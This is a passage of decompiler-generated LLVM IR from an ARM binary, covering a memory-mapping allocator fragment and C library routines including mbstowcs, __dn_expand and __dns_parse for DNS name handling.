  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v7_1203c = call i32 @__mmap(i32 0, i32 %v2_11fac.v6_12004, i32 3, i32 34, i32 -1, i32 0, i32 0)
  store i32 %v7_1203c, i32* %r0.global-to-local, align 4
  %v7_12040 = icmp eq i32 %v7_1203c, -1
  br i1 %v7_12040, label %bb38, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_11ff4
  %v1_12044 = load i32, i32* @r7, align 4
  %v2_12044 = load i32, i32* @r8, align 4
  %v3_12044 = inttoptr i32 %v2_12044 to i32*
  store i32 %v1_12044, i32* %v3_12044, align 4
  %v3_12048 = load i32, i32* @global_var_23e50.627, align 4
  %v2_1204c = add i32 %v3_12048, 1
  %v2_12050 = load i32, i32* @r6, align 4
  %v3_12050 = inttoptr i32 %v2_12050 to i32*
  store i32 %v2_1204c, i32* %v3_12050, align 4
  store i32 %v7_1203c, i32* @r2, align 4
  br label %bb39

bb38:                                             ; preds = %dec_label_pc_11ff4
  store i32 0, i32* @r2, align 4
  br label %bb39

bb39:                                             ; preds = %.thread7, %dec_label_pc_120d8, %dec_label_pc_120c4, %bb38
  %v0_1205c = load i32, i32* @r2, align 4
  store i32 %v0_1205c, i32* %r0.global-to-local, align 4
  %v2_12064 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12064, i32* @r4, align 4
  store i32 %v9_11f74, i32* @r6, align 4
  store i32 %v12_11f74, i32* @r7, align 4
  store i32 %v15_11f74, i32* @r8, align 4
  store i32 %v18_11f74, i32* @lr, align 4
  ret i32 %v0_1205c

dec_label_pc_1206c:                               ; preds = %dec_label_pc_11f94
  store i32 0, i32* @global_var_23e54.624, align 4
  br label %dec_label_pc_11fb4

dec_label_pc_1208c:                               ; preds = %bb34, %bb35
  %v2_1208c = ptrtoint i32* %stack_var_-28 to i32
  %v2_12090 = icmp ugt i32* %stack_var_-28, inttoptr (i32 8388607 to i32*)
  %v2_12094 = icmp ne i32* %stack_var_-28, inttoptr (i32 8388608 to i32*)
  %v3_12094 = and i1 %v2_12090, %v2_12094
  br i1 %v3_12094, label %bb40, label %bb41

bb40:                                             ; preds = %dec_label_pc_1208c
  %v6_12094 = ptrtoint i32* %stack_var_-8388636 to i32
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_1208c, %bb40
  %v0_12098 = phi i32 [ 0, %dec_label_pc_1208c ], [ %v6_12094, %bb40 ]
  %v3_12098 = icmp ult i32 %v0_12098, %v2_11fd8
  store i32 %v2_1208c, i32* %stack_var_-28, align 4
  br i1 %v3_12098, label %dec_label_pc_120a4, label %dec_label_pc_120c4

dec_label_pc_120a4:                               ; preds = %bb41
  %v3_120a4 = icmp ult i32 %v2_120b4, %v2_1208c
  br i1 %v3_120a4, label %dec_label_pc_11ff4, label %dec_label_pc_120c4

dec_label_pc_120c4:                               ; preds = %dec_label_pc_120a4, %bb41
  store i32 %v2_120b4, i32* @r2, align 4
  store i32 %v2_11fac, i32* %arg1, align 4
  %v0_120d0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_120d0, i32* @global_var_23e54.624, align 4
  br label %bb39

dec_label_pc_120d8:                               ; preds = %entry
  %v0_120d8 = call i32 @__errno_location()
  store i32 %v0_120d8, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_120e4 = inttoptr i32 %v0_120d8 to i32*
  store i32 12, i32* %v2_120e4, align 4
  br label %bb39

; uselistorder directives
  uselistorder i32 %v7_1203c, { 1, 0, 2 }
  uselistorder i1 %v2_11fcc, { 1, 0 }
  uselistorder i32 %v3_11fc8, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v2_120b4, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v2_11fac, { 3, 1, 2, 0, 4, 5 }
  uselistorder i32 %v2_11f78, { 2, 1, 3, 0 }
  uselistorder i32* %stack_var_-28, { 3, 0, 2, 5, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 1, 7, 3, 5, 6, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @__mmap, { 1, 0 }
  uselistorder i32 34, { 1, 3, 6, 4, 7, 5, 8, 12, 0, 9, 10, 2, 11 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_1208c, { 1, 0 }
  uselistorder label %bb39, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_11ff4, { 0, 2, 1 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_11fb4, { 1, 0 }
}

define i32 @mbstowcs() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_12104 = load i32, i32* @r1, align 4
  store i32 %v0_12104, i32* %stack_var_-12, align 4
  %v6_12104 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v6_12104, i32* @r1, align 4
  store i32 0, i32* @r3, align 4
  %v0_12110 = call i32 @mbsrtowcs()
  ret i32 %v0_12110

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__dn_expand(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp59 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %v3_12120 = load i32, i32* @r4, align 4
  store i32 %v3_12120, i32* %stack_var_-36, align 4
  store i32 %tmp59, i32* %ip.global-to-local, align 4
  %v0_12128 = load i32, i32* @r2, align 4
  %v9_12128 = icmp eq i32 %v0_12128, %arg2
  br i1 %v9_12128, label %.thread35, label %bb

.thread35:                                        ; preds = %entry
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  br label %.thread43

bb:                                               ; preds = %entry
  store i32 %v0_12128, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %tmp61 = icmp slt i32 %tmp59, 1
  br i1 %tmp61, label %.thread43, label %dec_label_pc_1214c

.thread43:                                        ; preds = %.thread35, %bb
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %sb.global-to-local, align 4
  %v0_1214444 = load i32, i32* @r3, align 4
  store i32 %v0_1214444, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12240

dec_label_pc_1214c:                               ; preds = %bb
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %sb.global-to-local, align 4
  %v0_1214446 = load i32, i32* @r3, align 4
  store i32 %v0_1214446, i32* %r6.global-to-local, align 4
  %v7_12150 = icmp sgt i32 %tmp59, 254
  %storemerge.v = select i1 %v7_12150, i32 254, i32 %tmp59
  %storemerge = add i32 %v0_1214446, %storemerge.v
  store i32 %storemerge, i32* %fp.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 %v0_1214446, i32* %r0.global-to-local, align 4
  store i32 %v0_12128, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_12168 = sub i32 %arg2, %arg1
  store i32 %v2_12168, i32* %sl.global-to-local, align 4
  %v5_1223c12 = icmp sgt i32 %v2_12168, 0
  br i1 %v5_1223c12, label %dec_label_pc_12170, label %dec_label_pc_12240

dec_label_pc_12170:                               ; preds = %dec_label_pc_1214c, %dec_label_pc_12230
  %v0_1223028 = phi i32 [ %v1_12230, %dec_label_pc_12230 ], [ 0, %dec_label_pc_1214c ]
  %v2_12228 = phi i32 [ %v0_121b822, %dec_label_pc_12230 ], [ %v0_1214446, %dec_label_pc_1214c ]
  %v1_121a0 = phi i32 [ %v1_12238, %dec_label_pc_12230 ], [ %v2_12168, %dec_label_pc_1214c ]
  %v3_12220 = phi i32 [ %v0_12234, %dec_label_pc_12230 ], [ %v0_12128, %dec_label_pc_1214c ]
  %v1_12170 = inttoptr i32 %v3_12220 to i8*
  %v2_12170 = load i8, i8* %v1_12170, align 1
  %v3_12170 = zext i8 %v2_12170 to i32
  store i32 %v3_12170, i32* %ip.global-to-local, align 4
  %v1_12174 = and i32 %v3_12170, 192
  %v2_12174 = icmp eq i32 %v1_12174, 0
  br i1 %v2_12174, label %dec_label_pc_121b0, label %dec_label_pc_1217c

dec_label_pc_1217c:                               ; preds = %dec_label_pc_12170
  %v1_1217c = add i32 %v3_12220, 1
  %v1_12180 = load i32, i32* %r4.global-to-local, align 4
  %v9_12180 = icmp eq i32 %v1_1217c, %v1_12180
  br i1 %v9_12180, label %dec_label_pc_12240, label %dec_label_pc_12188

dec_label_pc_12188:                               ; preds = %dec_label_pc_1217c
  %v2_12188 = inttoptr i32 %v1_1217c to i8*
  %v3_12188 = load i8, i8* %v2_12188, align 1
  %v4_12188 = zext i8 %v3_12188 to i32
  %tmp = urem i8 %v2_12170, 64
  %v1_1218c = zext i8 %tmp to i32
  %v0_12190 = load i32, i32* %r7.global-to-local, align 4
  %v1_12190 = icmp slt i32 %v0_12190, 0
  %v4_12194 = mul nuw nsw i32 %v1_1218c, 256
  %v5_12194 = or i32 %v4_12188, %v4_12194
  store i32 %v5_12194, i32* %r2.global-to-local, align 4
  br i1 %v1_12190, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_12188
  %v4_12198 = add i32 %v3_12220, 2
  %v3_1219c = load i32, i32* %r5.global-to-local, align 4
  %v5_1219c = sub i32 %v4_12198, %v3_1219c
  store i32 %v5_1219c, i32* %r7.global-to-local, align 4
  br label %bb63

bb63:                                             ; preds = %dec_label_pc_12188, %bb62
  %v6_121a4 = icmp slt i32 %v5_12194, %v1_121a0
  br i1 %v6_121a4, label %dec_label_pc_121a8, label %dec_label_pc_12240

dec_label_pc_121a8:                               ; preds = %bb63
  %v0_121a8 = load i32, i32* %sb.global-to-local, align 4
  %v2_121a8 = add i32 %v0_121a8, %v5_12194
  br label %dec_label_pc_12230

dec_label_pc_121b0:                               ; preds = %dec_label_pc_12170
  %v2_121b0 = icmp eq i8 %v2_12170, 0
  br i1 %v2_121b0, label %dec_label_pc_1221c, label %dec_label_pc_121b8

dec_label_pc_121b8:                               ; preds = %dec_label_pc_121b0
  %v1_121b8 = load i32, i32* %r6.global-to-local, align 4
  %v9_121b8 = icmp eq i32 %v2_12228, %v1_121b8
  br i1 %v9_121b8, label %.thread, label %bb64

bb64:                                             ; preds = %dec_label_pc_121b8
  %v4_121c0 = inttoptr i32 %v2_12228 to i8*
  store i8 46, i8* %v4_121c0, align 1
  %v5_121c0 = load i32, i32* %r0.global-to-local, align 4
  %v6_121c0 = add i32 %v5_121c0, 1
  store i32 %v6_121c0, i32* %r0.global-to-local, align 4
  %v0_121c4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_121b8, %bb64
  %v0_121ec = phi i32 [ %v2_12228, %dec_label_pc_121b8 ], [ %v6_121c0, %bb64 ]
  %v0_121e4 = phi i32 [ %v3_12220, %dec_label_pc_121b8 ], [ %v0_121c4.pre, %bb64 ]
  %v1_121c8 = inttoptr i32 %v0_121e4 to i8*
  %v2_121c8 = load i8, i8* %v1_121c8, align 1
  %v3_121c8 = zext i8 %v2_121c8 to i32
  store i32 %v3_121c8, i32* %r2.global-to-local, align 4
  %v5_121c8 = add i32 %v0_121e4, 1
  %v1_121cc = load i32, i32* %r4.global-to-local, align 4
  %v2_121cc = sub i32 %v1_121cc, %v5_121c8
  %v6_121d4 = icmp slt i32 %v3_121c8, %v2_121cc
  br i1 %v6_121d4, label %dec_label_pc_121d8, label %dec_label_pc_12240

dec_label_pc_121d8:                               ; preds = %.thread
  %v1_121d8 = load i32, i32* %fp.global-to-local, align 4
  %v2_121d8 = sub i32 %v1_121d8, %v0_121ec
  %v2_121dc = sub i32 %v3_121c8, %v2_121d8
  %v6_121dc = and i32 %v2_121dc, %v2_121d8
  %v7_121dc = icmp slt i32 %v6_121dc, 0
  %v8_121dc = icmp slt i32 %v2_121dc, 0
  %v2_121e0 = xor i1 %v8_121dc, %v7_121dc
  br i1 %v2_121e0, label %dec_label_pc_121e4, label %dec_label_pc_12240

dec_label_pc_121e4:                               ; preds = %dec_label_pc_121d8
  %v1_121e4 = add i32 %v0_121e4, 2
  %v2_121e8 = add i32 %v3_121c8, %v1_121e4
  store i32 %v2_121e8, i32* %r1.global-to-local, align 4
  store i32 %v0_121ec, i32* %ip.global-to-local, align 4
  store i32 %v5_121c8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12200

dec_label_pc_121f8:                               ; preds = %dec_label_pc_12200
  %v2_121f8 = inttoptr i32 %v0_12200 to i8*
  %v3_121f8 = load i8, i8* %v2_121f8, align 1
  %v4_121fc = inttoptr i32 %v0_1220c to i8*
  store i8 %v3_121f8, i8* %v4_121fc, align 1
  %v0_12200.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_12208.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_1220c.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12200

dec_label_pc_12200:                               ; preds = %dec_label_pc_121e4, %dec_label_pc_121f8
  %v0_1220c = phi i32 [ %v0_121ec, %dec_label_pc_121e4 ], [ %v0_1220c.pre, %dec_label_pc_121f8 ]
  %v1_12208 = phi i32 [ %v2_121e8, %dec_label_pc_121e4 ], [ %v1_12208.pre, %dec_label_pc_121f8 ]
  %v0_12200 = phi i32 [ %v5_121c8, %dec_label_pc_121e4 ], [ %v0_12200.pre, %dec_label_pc_121f8 ]
  %v1_12204 = add i32 %v0_12200, 1
  store i32 %v1_12204, i32* %r2.global-to-local, align 4
  %v9_12208 = icmp eq i32 %v1_12204, %v1_12208
  store i32 %v0_1220c, i32* %r0.global-to-local, align 4
  %v1_12210 = add i32 %v0_1220c, 1
  store i32 %v1_12210, i32* %ip.global-to-local, align 4
  br i1 %v9_12208, label %dec_label_pc_12230.loopexit, label %dec_label_pc_121f8

dec_label_pc_1221c:                               ; preds = %dec_label_pc_121b0
  %v0_1221c = load i32, i32* %r7.global-to-local, align 4
  %v1_1221c = icmp slt i32 %v0_1221c, 0
  br i1 %v1_1221c, label %bb65, label %bb66

bb65:                                             ; preds = %dec_label_pc_1221c
  %v4_12220 = add i32 %v3_12220, 1
  %v3_12224 = load i32, i32* %r5.global-to-local, align 4
  %v5_12224 = sub i32 %v4_12220, %v3_12224
  store i32 %v5_12224, i32* %r7.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_1221c, %bb65
  %v3_12228 = inttoptr i32 %v2_12228 to i8*
  store i8 0, i8* %v3_12228, align 1
  %v0_12244.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_12244

dec_label_pc_12230.loopexit:                      ; preds = %dec_label_pc_12200
  %v0_12230.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_12238.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_12230

dec_label_pc_12230:                               ; preds = %dec_label_pc_12230.loopexit, %dec_label_pc_121a8
  %v1_12238 = phi i32 [ %v1_12238.pre, %dec_label_pc_12230.loopexit ], [ %v1_121a0, %dec_label_pc_121a8 ]
  %v0_12234 = phi i32 [ %v0_12200, %dec_label_pc_12230.loopexit ], [ %v2_121a8, %dec_label_pc_121a8 ]
  %v0_12230 = phi i32 [ %v0_12230.pre, %dec_label_pc_12230.loopexit ], [ %v0_1223028, %dec_label_pc_121a8 ]
  %v0_121b822 = phi i32 [ %v0_1220c, %dec_label_pc_12230.loopexit ], [ %v2_12228, %dec_label_pc_121a8 ]
  %v1_12230 = add i32 %v0_12230, 2
  store i32 %v1_12230, i32* %r8.global-to-local, align 4
  store i32 %v0_12234, i32* %r1.global-to-local, align 4
  %v5_1223c = icmp slt i32 %v1_12230, %v1_12238
  br i1 %v5_1223c, label %dec_label_pc_12170, label %dec_label_pc_12240

dec_label_pc_12240:                               ; preds = %dec_label_pc_12230, %dec_label_pc_1217c, %bb63, %.thread, %dec_label_pc_121d8, %dec_label_pc_1214c, %.thread43
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_12244

dec_label_pc_12244:                               ; preds = %bb66, %dec_label_pc_12240
  %v0_12244 = phi i32 [ %v0_12244.pre, %bb66 ], [ -1, %dec_label_pc_12240 ]
  store i32 %v0_12244, i32* %r0.global-to-local, align 4
  %v2_12248 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_12248, i32* @r4, align 4
  ret i32 %v0_12244

; uselistorder directives
  uselistorder i32 %v0_12244, { 1, 0 }
  uselistorder i32 %v1_12230, { 1, 2, 0 }
  uselistorder i32 %v0_12234, { 1, 0 }
  uselistorder i32 %v1_12238, { 1, 0 }
  uselistorder i32 %v0_12200, { 0, 2, 1 }
  uselistorder i32 %v0_1220c, { 0, 3, 2, 1 }
  uselistorder i32 %v2_121dc, { 1, 0 }
  uselistorder i32 %v0_121e4, { 0, 2, 1 }
  uselistorder i8 %v2_12170, { 1, 0, 2 }
  uselistorder i32 %v2_12228, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_1214446, { 0, 2, 1, 3 }
  uselistorder i32 %tmp59, { 1, 2, 0, 3 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 5, 1, 3, 2, 4, 6 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 6, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 3, 1, 0, 4, 5 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_12244, { 1, 0 }
  uselistorder label %dec_label_pc_12240, { 0, 4, 3, 2, 1, 5, 6 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_12200, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb63, { 1, 0 }
  uselistorder label %dec_label_pc_12170, { 1, 0 }
  uselistorder label %.thread43, { 1, 0 }
}

define i32 @__dns_parse(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  store i32 %arg4, i32* %fp.global-to-local, align 4
  %v7_1226c = icmp sgt i32 %arg2, 11
  br i1 %v7_1226c, label %dec_label_pc_12270, label %dec_label_pc_123d8

dec_label_pc_12270:                               ; preds = %entry
  %v1_12270 = add i32 %arg1, 3
  %v2_12270 = inttoptr i32 %v1_12270 to i8*
  %v3_12270 = load i8, i8* %v2_12270, align 1
  %tmp = urem i8 %v3_12270, 16
  %v2_12274 = icmp eq i8 %tmp, 0
  br i1 %v2_12274, label %dec_label_pc_1227c, label %dec_label_pc_123d8

dec_label_pc_1227c:                               ; preds = %dec_label_pc_12270
  %v1_1227c = add i32 %arg1, 7
  %v2_1227c = inttoptr i32 %v1_1227c to i8*
  %v3_1227c = load i8, i8* %v2_1227c, align 1
  %v4_1227c = zext i8 %v3_1227c to i32
  %v1_12280 = add i32 %arg1, 4
  %v2_12280 = inttoptr i32 %v1_12280 to i8*
  %v3_12280 = load i8, i8* %v2_12280, align 1
  %v4_12280 = zext i8 %v3_12280 to i32
  %v1_12284 = add i32 %arg1, 5
  %v2_12284 = inttoptr i32 %v1_12284 to i8*
  %v3_12284 = load i8, i8* %v2_12284, align 1
  %v4_12284 = zext i8 %v3_12284 to i32
  %v1_12288 = add i32 %arg1, 6
  %v2_12288 = inttoptr i32 %v1_12288 to i8*
  %v3_12288 = load i8, i8* %v2_12288, align 1
  %v4_12288 = zext i8 %v3_12288 to i32
  %v4_1228c = mul nuw nsw i32 %v4_12280, 256
  %v5_1228c = or i32 %v4_12284, %v4_1228c
  %v4_12290 = mul nuw nsw i32 %v4_12288, 256
  %v5_12290 = or i32 %v4_12290, %v4_1227c
  store i32 %v5_12290, i32* %r8.global-to-local, align 4
  %v2_12294 = add nuw nsw i32 %v5_12290, %v5_1228c
  %v8_1229c = icmp ugt i32 %v2_12294, 64
  br i1 %v8_1229c, label %dec_label_pc_123d8, label %dec_label_pc_122a0

dec_label_pc_122a0:                               ; preds = %dec_label_pc_1227c
  %v2_122a0 = add i32 %arg2, %arg1
  %v1_122a4 = add i32 %v2_122a0, -6
  store i32 %v1_122a4, i32* @ip, align 4
  %v1_122a8 = add i32 %arg1, 12
  %v2_1230456 = icmp eq i32 %v5_1228c, 0
  br i1 %v2_1230456, label %dec_label_pc_123b4, label %dec_label_pc_1230c

dec_label_pc_122b0:                               ; preds = %dec_label_pc_122c0
  %v1_122b0 = add i32 %v0_122b0, 1
  br label %dec_label_pc_122b4

dec_label_pc_122b4:                               ; preds = %dec_label_pc_1230c, %dec_label_pc_122b0
  %v0_122b0 = phi i32 [ %v1_1230c61, %dec_label_pc_1230c ], [ %v1_122b0, %dec_label_pc_122b0 ]
  %v0_122b8 = phi i32 [ %v2_1230c, %dec_label_pc_1230c ], [ %v1_122b8, %dec_label_pc_122b0 ]
  %v1_122b8 = add i32 %v0_122b8, 1
  %v6_122bc = icmp slt i32 %v0_122b8, %arg2
  %v1_122c0 = inttoptr i32 %v0_122b0 to i8*
  br i1 %v6_122bc, label %dec_label_pc_122c0, label %dec_label_pc_122d0

dec_label_pc_122c0:                               ; preds = %dec_label_pc_122b4
  %v2_122c0 = load i8, i8* %v1_122c0, align 1
  %v3_122c0 = zext i8 %v2_122c0 to i32
  %v1_122c4 = add nsw i32 %v3_122c0, -1
  %tmp63 = icmp ult i32 %v1_122c4, 127
  br i1 %tmp63, label %dec_label_pc_122b0, label %dec_label_pc_122d0

dec_label_pc_122d0:                               ; preds = %dec_label_pc_122b4, %dec_label_pc_122c0
  %v2_122d0 = load i8, i8* %v1_122c0, align 1
  %v2_122d4 = icmp ugt i8 %v2_122d0, -64
  %v7_122d4 = icmp eq i8 %v2_122d0, -63
  %v2_122d8 = xor i1 %v7_122d4, true
  %v3_122d8 = and i1 %v2_122d4, %v2_122d8
  br i1 %v3_122d8, label %dec_label_pc_123d8, label %dec_label_pc_122dc

dec_label_pc_122dc:                               ; preds = %dec_label_pc_122d0
  br i1 %v7_122d4, label %dec_label_pc_122e0, label %dec_label_pc_122ec

dec_label_pc_122e0:                               ; preds = %dec_label_pc_122dc
  %v1_122e0 = add i32 %v0_122b0, 1
  %v2_122e0 = inttoptr i32 %v1_122e0 to i8*
  %v3_122e0 = load i8, i8* %v2_122e0, align 1
  %v2_122e4 = icmp eq i8 %v3_122e0, -1
  br i1 %v2_122e4, label %dec_label_pc_123d8, label %dec_label_pc_122ec

dec_label_pc_122ec:                               ; preds = %dec_label_pc_122dc, %dec_label_pc_122e0
  %tmp64 = icmp ugt i32 %v0_122b0, %v1_122a4
  br i1 %tmp64, label %dec_label_pc_123d8, label %dec_label_pc_122f4

dec_label_pc_122f4:                               ; preds = %dec_label_pc_122ec
  %v2_122f4 = icmp eq i8 %v2_122d0, 0
  %. = select i1 %v2_122f4, i32 5, i32 6
  %v2_12300 = add i32 %., %v0_122b0
  %v2_12304 = icmp eq i32 %v1_1230462, 0
  br i1 %v2_12304, label %dec_label_pc_123b4, label %dec_label_pc_1230c

dec_label_pc_1230c:                               ; preds = %dec_label_pc_122f4, %dec_label_pc_122a0
  %v1_1230462.in = phi i32 [ %v1_1230462, %dec_label_pc_122f4 ], [ %v5_1228c, %dec_label_pc_122a0 ]
  %v1_1230c61 = phi i32 [ %v2_12300, %dec_label_pc_122f4 ], [ %v1_122a8, %dec_label_pc_122a0 ]
  %v1_1230462 = add i32 %v1_1230462.in, -1
  %v2_1230c = sub i32 %v1_1230c61, %arg1
  br label %dec_label_pc_122b4

dec_label_pc_12314:                               ; preds = %dec_label_pc_12324
  %v1_12314 = add i32 %v0_12314, 1
  br label %dec_label_pc_12318

dec_label_pc_12318:                               ; preds = %dec_label_pc_123c4, %dec_label_pc_12314
  %v0_12314 = phi i32 [ %v1_123c4, %dec_label_pc_123c4 ], [ %v1_12314, %dec_label_pc_12314 ]
  %v0_1231c = phi i32 [ %v2_123c4, %dec_label_pc_123c4 ], [ %v1_1231c, %dec_label_pc_12314 ]
  %v2_12318 = sub i32 %v0_1231c, %v1_12318.pre
  %v4_12318 = xor i32 %v0_1231c, %v1_12318.pre
  %v5_12318 = xor i32 %v2_12318, %v0_1231c
  %v6_12318 = and i32 %v5_12318, %v4_12318
  %v7_12318 = icmp slt i32 %v6_12318, 0
  %v8_12318 = icmp slt i32 %v2_12318, 0
  %v1_1231c = add i32 %v0_1231c, 1
  %v2_12320 = xor i1 %v8_12318, %v7_12318
  %v1_12324 = inttoptr i32 %v0_12314 to i8*
  br i1 %v2_12320, label %dec_label_pc_12324, label %dec_label_pc_12334

dec_label_pc_12324:                               ; preds = %dec_label_pc_12318
  %v2_12324 = load i8, i8* %v1_12324, align 1
  %v3_12324 = zext i8 %v2_12324 to i32
  %v1_12328 = add nsw i32 %v3_12324, -1
  %tmp65 = icmp ult i32 %v1_12328, 127
  br i1 %tmp65, label %dec_label_pc_12314, label %dec_label_pc_12334

dec_label_pc_12334:                               ; preds = %dec_label_pc_12318, %dec_label_pc_12324
  %v2_12334 = load i8, i8* %v1_12324, align 1
  %v2_12338 = icmp ugt i8 %v2_12334, -64
  %v7_12338 = icmp eq i8 %v2_12334, -63
  %v2_1233c = xor i1 %v7_12338, true
  %v3_1233c = and i1 %v2_12338, %v2_1233c
  br i1 %v3_1233c, label %dec_label_pc_123d8, label %dec_label_pc_12340

dec_label_pc_12340:                               ; preds = %dec_label_pc_12334
  br i1 %v7_12338, label %dec_label_pc_12344, label %dec_label_pc_12350

dec_label_pc_12344:                               ; preds = %dec_label_pc_12340
  %v1_12344 = add i32 %v0_12314, 1
  %v2_12344 = inttoptr i32 %v1_12344 to i8*
  %v3_12344 = load i8, i8* %v2_12344, align 1
  %v2_12348 = icmp eq i8 %v3_12344, -1
  br i1 %v2_12348, label %dec_label_pc_123d8, label %dec_label_pc_12350

dec_label_pc_12350:                               ; preds = %dec_label_pc_12340, %dec_label_pc_12344
  %v1_12350 = load i32, i32* %sb.global-to-local, align 4
  %tmp66 = icmp ugt i32 %v0_12314, %v1_12350
  br i1 %tmp66, label %dec_label_pc_123d8, label %dec_label_pc_12358

dec_label_pc_12358:                               ; preds = %dec_label_pc_12350
  %v2_12358 = icmp eq i8 %v2_12334, 0
  %.52 = select i1 %v2_12358, i32 1, i32 2
  %v2_12364 = add i32 %.52, %v0_12314
  %v1_12368 = add i32 %v2_12364, 9
  %v2_12368 = inttoptr i32 %v1_12368 to i8*
  %v3_12368 = load i8, i8* %v2_12368, align 1
  %v4_12368 = zext i8 %v3_12368 to i32
  %v1_1236c = add i32 %v2_12364, 8
  %v2_1236c = inttoptr i32 %v1_1236c to i8*
  %v3_1236c = load i8, i8* %v2_1236c, align 1
  %v4_1236c = zext i8 %v3_1236c to i32
  %v4_12370 = mul nuw nsw i32 %v4_1236c, 256
  %v5_12370 = or i32 %v4_12370, %v4_12368
  store i32 %v5_12370, i32* %r4.global-to-local, align 4
  %v2_12374 = add i32 %v5_12370, %v2_12364
  %v1_12378 = load i32, i32* %sl.global-to-local, align 4
  %tmp67 = icmp ugt i32 %v2_12374, %v1_12378
  br i1 %tmp67, label %dec_label_pc_123d8, label %dec_label_pc_12380

dec_label_pc_12380:                               ; preds = %dec_label_pc_12358
  %v1_12380 = add i32 %v2_12364, 10
  store i32 %v1_12380, i32* %r6.global-to-local, align 4
  %v0_1238c = load i32, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* @ip, align 4
  call void @__pseudo_branch(i32 %arg3)
  %v1_123a4 = icmp slt i32 %v0_1238c, 0
  br i1 %v1_123a4, label %dec_label_pc_123d8, label %dec_label_pc_123ac

dec_label_pc_123ac:                               ; preds = %dec_label_pc_12380
  %v0_123ac = load i32, i32* %r6.global-to-local, align 4
  %v1_123ac = load i32, i32* %r4.global-to-local, align 4
  %v0_123bc = load i32, i32* %r8.global-to-local, align 4
  %v1_123bc = add i32 %v0_123bc, -1
  store i32 %v1_123bc, i32* %r8.global-to-local, align 4
  %v2_123bc = icmp eq i32 %v0_123bc, 0
  br i1 %v2_123bc, label %dec_label_pc_123d8, label %dec_label_pc_123ac.dec_label_pc_123c4_crit_edge

dec_label_pc_123ac.dec_label_pc_123c4_crit_edge:  ; preds = %dec_label_pc_123ac
  %v2_123ac = add i32 %v1_123ac, %v0_123ac
  %v0_123c4.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_12318.pre.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_123c4

